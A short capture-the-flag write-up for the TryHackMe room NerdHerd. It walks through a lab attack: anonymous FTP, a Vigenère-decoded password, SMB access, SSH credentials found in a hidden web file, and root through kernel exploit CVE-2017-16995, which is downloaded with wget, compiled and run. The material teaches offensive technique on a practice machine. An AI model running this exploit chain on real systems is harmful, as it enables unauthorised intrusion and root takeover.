---
title: "NerdHerd - TryHackMe"
date: "2021-01-03"
categories: 
  - "tryhackme"
---

write-up for room tryhackme room [nerdherd](https://tryhackme.com/room/nerdherd).

Start with Nmap scan

```
nmap -A -oN allport -p- $IP -T4
```

![](/Images/nerdherd/Screenshot-2021-01-02-211517.png)

FTP server is running which allow the anonymous users to login. login to FTP and download available files. cannot login to SMB because it require password.

![](/Images/nerdherd/Screenshot-2021-01-02-001736.png)

When we go though all the file we downloaded, can be notice this detail.

![](/Images/nerdherd/Screenshot-2021-01-02-001931.png)

we found the owner name, but it little suspicious maybe it can ciphered text, you can check what kind of cipher from here.

**[Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier#vigenere-cipher)**

![](/Images/nerdherd/Screenshot-2021-01-02-202045.png)

for decipher Vigenere we need key, for now we don't have key so keep enumerate. There is website hosted in port 1337, when we inspect the webpage we

![](/Images/nerdherd/Screenshot-2021-01-02-202324.png)

there is video link when you go to that link you can see it play a song, keep listen to song the word "**bird**" keep coming so i though it might be the key. tried and not quiet right then tried "**birdistheword**" it decipher word correctly.

![](/Images/nerdherd/Screenshot-2021-01-02-202803-1024x604.png)

Now we have password, this might give access to SMB so i tired so many users with this password all failed. after long time thinking i tired to reverse image search and come with these name.

![](/Images/nerdherd/Screenshot-2021-01-03-165409.png)

```
smbclient -U chuck //$IP/nerdherd_classified
```

![](/Images/nerdherd/Screenshot-2021-01-02-210321.png)

in SMB we find secr3t.txt which contain the hidden directory details, when we go to that endpoint we find **creds.txt** file.

![](/Images/nerdherd/Screenshot-2021-01-02-210433-1.png)

we have creds login in ssh, now we can login and escalate privilege.

## Privilege Escalation

commands to run when login into machine.

- uname -a
- sudo -l
- id
- find / -user root -perm /4000 2>/dev/null
- linpeas.sh

when we enumerating we find the kernel version is vulnerable.

**[CVE-2017-16995](https://www.exploit-db.com/exploits/45010)**

download to local PC and upload to VM in **/tmp** folder

```
wget http://$IP/45010.c 

gcc 45010.c -o exploit

chmod +x exploit

./exploit
```

![](/Images/nerdherd/Screenshot-2021-01-02-211146.png)

![](/Images/nerdherd/Screenshot-2021-01-02-211303.png)

Finally Root.

Happy Hacking!!
